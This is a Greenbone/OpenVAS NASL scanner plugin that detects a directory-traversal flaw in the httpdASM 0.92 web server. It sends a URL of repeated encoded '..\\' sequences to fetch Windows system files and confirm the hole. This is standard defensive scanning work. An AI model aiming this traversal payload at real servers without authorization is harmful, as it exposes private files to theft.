if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103005" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-01-03 14:40:34 +0100 (Mon, 03 Jan 2011)" );
	script_bugtraq_id( 45599 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "httpdASM Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/45599" );
	script_xref( name: "URL", value: "http://www.japheth.de/httpdASM.html" );
	script_xref( name: "URL", value: "http://www.johnleitch.net/Vulnerabilities/httpdASM.0.92.Directory.Traversal/73" );
	script_category( ACT_ATTACK );
	script_family( "Web Servers" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "httpdASM is prone to a directory-traversal vulnerability because it
  fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "A remote attacker may leverage this issue to retrieve arbitrary files
  in the context of the affected application, potentially revealing sensitive information that may lead
  to other attacks." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "affected", value: "httpdASM 0.92 is vulnerable. Other versions may also be affected." );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || ContainsString( banner, "Server:" )){
	exit( 0 );
}
files = traversal_files( "windows" );
for file in keys( files ) {
	url = NASLString( "/", crap( data: "%2E%2E%5C", length: 10 * 9 ), files[file] );
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

